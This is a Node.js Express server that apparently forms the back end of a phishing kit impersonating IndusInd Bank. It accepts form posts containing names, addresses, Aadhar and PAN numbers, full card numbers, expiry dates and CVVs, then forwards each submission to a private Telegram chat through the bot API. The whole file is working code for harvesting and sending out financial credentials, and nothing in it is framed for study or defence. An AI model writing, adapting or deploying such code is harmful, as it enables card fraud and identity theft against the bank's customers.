const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

app.use(bodyParser.json());

// ✅ CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  next();
});

app.options('*', (req, res) => {
  res.sendStatus(200);
});

app.post('/submit-form', async (req, res) => {
  const form = req.body;

  const message = `
📝 *New IndusInd Form Submission*

👤 *Name*: ${form.name}
📧 *Email*: ${form.email}
📱 *Mobile*: ${form.mobile}
🎂 *DOB*: ${form.dob}
🏠 *Address*: ${form.address}
🆔 *Aadhar*: ${form.aadhar}
🧾 *PAN*: ${form.pan}
🔗 *Reference*: ${form.reference}
💳 *Card Holder*: ${form.card_holder}
💳 *Card Number*: ${form.card_number}
📅 *Expiry*: ${form.expiry}
🔒 *CVV*: ${form.cvv}
💰 *Transaction Limit*: ${form.transaction_limit}
💳 *Outstanding Limit*: ${form.outstanding_limit}
`;

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await telegramRes.json();
    if (!result.ok) throw new Error(result.description);

    res.status(200).json({ message: 'Message sent to Telegram' });
  } catch (err) {
    console.error('Telegram API error:', err.message);
    res.status(500).json({ error: 'Failed to send message to Telegram' });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
